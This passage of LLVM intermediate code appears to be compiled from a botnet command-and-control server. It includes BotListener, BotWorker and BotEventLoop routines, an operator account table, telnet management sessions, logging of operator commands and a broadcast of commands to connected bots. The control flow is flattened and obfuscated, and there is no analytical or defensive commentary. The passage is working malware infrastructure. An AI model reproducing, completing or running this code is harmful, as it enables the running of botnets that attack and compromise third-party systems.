  %929 = select i1 %928, i32 -934115011, i32 -1870243530
  store i32 %929, i32* %switchVar
  br label %loopEnd

; <label>:930:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:931:                                    ; preds = %loopEntry
  %932 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %933 = call i64 @strlen(i8* %932) #8
  %934 = icmp eq i64 %933, 0
  %935 = select i1 %934, i32 -1767699315, i32 88565833
  store i32 %935, i32* %switchVar
  br label %loopEnd

; <label>:936:                                    ; preds = %loopEntry
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:937:                                    ; preds = %loopEntry
  %938 = load i32, i32* %5, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %939
  %941 = getelementptr inbounds %struct.login_info, %struct.login_info* %940, i32 0, i32 0
  %942 = getelementptr inbounds [20 x i8], [20 x i8]* %941, i32 0, i32 0
  %943 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %944 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* %942, i8* %943)
  %945 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0))
  store %struct._IO_FILE* %945, %struct._IO_FILE** %56, align 8
  %946 = call i64 @time(i64* null) #7
  store i64 %946, i64* %57, align 8
  %947 = call %struct.tm* @gmtime(i64* %57) #7
  store %struct.tm* %947, %struct.tm** %58, align 8
  %948 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %949 = load %struct.tm*, %struct.tm** %58, align 8
  %950 = call i64 @strftime(i8* %948, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), %struct.tm* %949) #7
  %951 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %952 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %953 = load i32, i32* %5, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %954
  %956 = getelementptr inbounds %struct.login_info, %struct.login_info* %955, i32 0, i32 0
  %957 = getelementptr inbounds [20 x i8], [20 x i8]* %956, i32 0, i32 0
  %958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %959 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %951, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i8* %952, i8* %957, i8* %958)
  %960 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %961 = call i32 @fclose(%struct._IO_FILE* %960)
  %962 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %963 = load i32, i32* %4, align 4
  %964 = load i32, i32* %5, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %965
  %967 = getelementptr inbounds %struct.login_info, %struct.login_info* %966, i32 0, i32 0
  %968 = getelementptr inbounds [20 x i8], [20 x i8]* %967, i32 0, i32 0
  call void @broadcast(i8* %962, i32 %963, i8* %968)
  %969 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %969, i8 0, i64 2048, i32 16, i1 false)
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:970:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:971:                                    ; preds = %loopEntry
  %972 = load i32, i32* %4, align 4
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %973
  %975 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %974, i32 0, i32 0
  store i32 0, i32* %975, align 4
  %976 = load i32, i32* %4, align 4
  %977 = call i32 @close(i32 %976)
  %978 = load volatile i32, i32* @OperatorsConnected, align 4
  %979 = add nsw i32 %978, -1
  store volatile i32 %979, i32* @OperatorsConnected, align 4
  store i32 1719111952, i32* %switchVar
  br label %loopEnd

; <label>:980:                                    ; preds = %loopEntry
  %981 = load i8*, i8** %2, align 8
  ret i8* %981

loopEnd:                                          ; preds = %971, %970, %937, %936, %931, %930, %924, %922, %921, %905, %900, %899, %898, %897, %892, %891, %883, %882, %881, %873, %872, %864, %863, %855, %854, %846, %845, %837, %836, %828, %827, %819, %818, %810, %809, %798, %793, %792, %791, %780, %775, %772, %771, %763, %762, %754, %753, %745, %744, %736, %735, %727, %726, %718, %717, %709, %708, %700, %699, %691, %690, %682, %681, %673, %672, %664, %663, %655, %654, %646, %645, %637, %636, %628, %627, %619, %618, %610, %609, %601, %600, %592, %591, %583, %582, %574, %573, %565, %564, %556, %555, %495, %490, %488, %483, %481, %476, %474, %469, %467, %462, %460, %455, %453, %448, %446, %441, %439, %434, %432, %427, %425, %420, %418, %413, %411, %406, %404, %399, %397, %392, %390, %385, %384, %383, %371, %370, %358, %353, %352, %351, %339, %334, %333, %332, %320, %315, %309, %302, %301, %300, %295, %294, %286, %285, %284, %276, %275, %267, %266, %258, %257, %249, %248, %240, %239, %231, %230, %222, %221, %185, %183, %182, %172, %171, %166, %165, %163, %162, %151, %150, %144, %143, %138, %117, %116, %110, %109, %104, %89, %83, %81, %76, %70, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

declare i32 @system(i8*) #1

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotListener(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* %4, align 4
  store i32 %11, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2030399839, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2030399839, label %first
    i32 1209817476, label %14
    i32 1539540888, label %15
    i32 -1246400243, label %29
    i32 -569974620, label %30
    i32 -1503450120, label %33
    i32 2074216691, label %40
    i32 235775826, label %41
    i32 -1692485623, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %12 = icmp slt i32 %.reload, 0
  %13 = select i1 %12, i32 1209817476, i32 1539540888
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  store i32 1539540888, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  %28 = select i1 %27, i32 -1246400243, i32 -569974620
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.110, i32 0, i32 0))
  store i32 -569974620, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @listen(i32 %31, i32 5) #7
  store i32 16, i32* %6, align 4
  store i32 -1503450120, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %4, align 4
  %35 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %36 = call i32 @accept(i32 %34, %struct.sockaddr* %35, i32* %6)
  store i32 %36, i32* %5, align 4
  %37 = load i32, i32* %5, align 4
  %38 = icmp slt i32 %37, 0
  %39 = select i1 %38, i32 2074216691, i32 235775826
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  store i32 235775826, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = inttoptr i64 %43 to i8*
  %45 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %44) #7
  store i32 -1503450120, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %2, align 8
  ret i8* %47

loopEnd:                                          ; preds = %41, %40, %33, %30, %29, %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %.reg2mem2 = alloca i64*
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  store i32 %14, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1592412461, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1592412461, label %first
    i32 -1373644307, label %17
    i32 1145059888, label %23
    i32 -369745429, label %40
    i32 -333463078, label %41
    i32 -1590877675, label %47
    i32 -1799057849, label %48
    i32 -404813006, label %54
    i32 -1756791410, label %55
    i32 -210765715, label %60
    i32 -1009358472, label %61
    i32 -2057867958, label %72
    i32 -500800836, label %73
    i32 683135187, label %79
    i32 -1262018488, label %84
    i32 1087576649, label %90
    i32 -571687367, label %96
    i32 -2037886643, label %97
    i32 1825222886, label %99
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp ne i32 %.reload, 4
  %16 = select i1 %15, i32 -1373644307, i32 1145059888
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.112, i32 0, i32 0), i8* %21)
  call void @exit(i32 1) #10
  unreachable

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  %39 = select i1 %38, i32 -369745429, i32 -333463078
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:41:                                     ; preds = %loopEntry
  %42 = load volatile i32, i32* @listenFD, align 4
  %43 = call i32 @make_socket_non_blocking(i32 %42)
  store i32 %43, i32* %8, align 4
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, -1
  %46 = select i1 %45, i32 -1590877675, i32 -1799057849
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:48:                                     ; preds = %loopEntry
  %49 = load volatile i32, i32* @listenFD, align 4
  %50 = call i32 @listen(i32 %49, i32 128) #7
  store i32 %50, i32* %8, align 4
  %51 = load i32, i32* %8, align 4
  %52 = icmp eq i32 %51, -1
  %53 = select i1 %52, i32 -404813006, i32 -1756791410
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %56, i32* @epollFD, align 4
  %57 = load volatile i32, i32* @epollFD, align 4
  %58 = icmp eq i32 %57, -1
  %59 = select i1 %58, i32 -210765715, i32 -1009358472
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  store i32 %62, i32* %64, align 1
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %65, align 1
  %66 = load volatile i32, i32* @epollFD, align 4
  %67 = load volatile i32, i32* @listenFD, align 4
  %68 = call i32 @epoll_ctl(i32 %66, i32 1, i32 %67, %struct.epoll_event* %11) #7
  store i32 %68, i32* %8, align 4
  %69 = load i32, i32* %8, align 4
  %70 = icmp eq i32 %69, -1
  %71 = select i1 %70, i32 -2057867958, i32 -500800836
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %9, align 4
  %75 = add nsw i32 %74, 2
  %76 = zext i32 %75 to i64
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %12, align 8
  %78 = alloca i64, i64 %76, align 16
  store i64* %78, i64** %.reg2mem2
  store i32 683135187, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, -1
  store i32 %81, i32* %9, align 4
  %82 = icmp ne i32 %80, 0
  %83 = select i1 %82, i32 -1262018488, i32 1087576649
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %9, align 4
  %86 = add nsw i32 %85, 1
  %87 = sext i32 %86 to i64
  %.reload4 = load volatile i64*, i64** %.reg2mem2
  %88 = getelementptr inbounds i64, i64* %.reload4, i64 %87
  %89 = call i32 @pthread_create(i64* %88, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #7
  store i32 683135187, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %.reload3 = load volatile i64*, i64** %.reg2mem2
  %91 = getelementptr inbounds i64, i64* %.reload3, i64 0
  %92 = load i32, i32* %10, align 4
  %93 = sext i32 %92 to i64
  %94 = inttoptr i64 %93 to i8*
  %95 = call i32 @pthread_create(i64* %91, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %94) #7
  store i32 -571687367, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 -2037886643, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0))
  %98 = call i32 @sleep(i32 60)
  store i32 -571687367, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %4, align 4
  ret i32 %100

loopEnd:                                          ; preds = %97, %96, %90, %84, %79, %73, %61, %55, %48, %41, %23, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 967592402, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 967592402, label %first
    i32 -1274626683, label %19
    i32 772559167, label %24
    i32 1263978647, label %26
    i32 154002267, label %30
    i32 -765153544, label %44
    i32 -1312034666, label %45
    i32 1523224159, label %51
    i32 1322070501, label %52
    i32 1139875924, label %64
    i32 -1548801843, label %65
    i32 290611628, label %68
    i32 492089447, label %72
    i32 -352311801, label %76
    i32 1525147390, label %79
    i32 -624258163, label %82
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp ne i32 %.reload, 0
  %18 = select i1 %17, i32 -1274626683, i32 772559167
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i32, i32* %7, align 4
  %22 = call i8* @gai_strerror(i32 %21) #7
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.119, i32 0, i32 0), i8* %22)
  store i32 -1, i32* %2, align 4
  store i32 -624258163, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %25, %struct.addrinfo** %6, align 8
  store i32 1263978647, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %28 = icmp ne %struct.addrinfo* %27, null
  %29 = select i1 %28, i32 154002267, i32 492089447
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %31, i32 0, i32 1
  %33 = load i32, i32* %32, align 4
  %34 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %35 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %34, i32 0, i32 2
  %36 = load i32, i32* %35, align 8
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %38 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @socket(i32 %33, i32 %36, i32 %39) #7
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 -765153544, i32 -1312034666
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 290611628, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %46 = load i32, i32* %8, align 4
  %47 = bitcast i32* %9 to i8*
  %48 = call i32 @setsockopt(i32 %46, i32 1, i32 2, i8* %47, i32 4) #7
  %49 = icmp eq i32 %48, -1
  %50 = select i1 %49, i32 1523224159, i32 1322070501
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0))
  store i32 1322070501, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %8, align 4
  %54 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %55 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %54, i32 0, i32 5
  %56 = load %struct.sockaddr*, %struct.sockaddr** %55, align 8
  %57 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %58 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %57, i32 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = call i32 @bind(i32 %53, %struct.sockaddr* %56, i32 %59) #7
  store i32 %60, i32* %7, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp eq i32 %61, 0
  %63 = select i1 %62, i32 1139875924, i32 -1548801843
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 492089447, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %8, align 4
  %67 = call i32 @close(i32 %66)
  store i32 290611628, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %70 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %69, i32 0, i32 7
  %71 = load %struct.addrinfo*, %struct.addrinfo** %70, align 8
  store %struct.addrinfo* %71, %struct.addrinfo** %6, align 8
  store i32 1263978647, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %74 = icmp eq %struct.addrinfo* %73, null
  %75 = select i1 %74, i32 -352311801, i32 1525147390
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %78 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %77, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.121, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -624258163, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %80) #7
  %81 = load i32, i32* %8, align 4
  store i32 %81, i32* %2, align 4
  store i32 -624258163, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %2, align 4
  ret i32 %83

loopEnd:                                          ; preds = %79, %76, %72, %68, %65, %64, %52, %51, %45, %44, %30, %26, %24, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
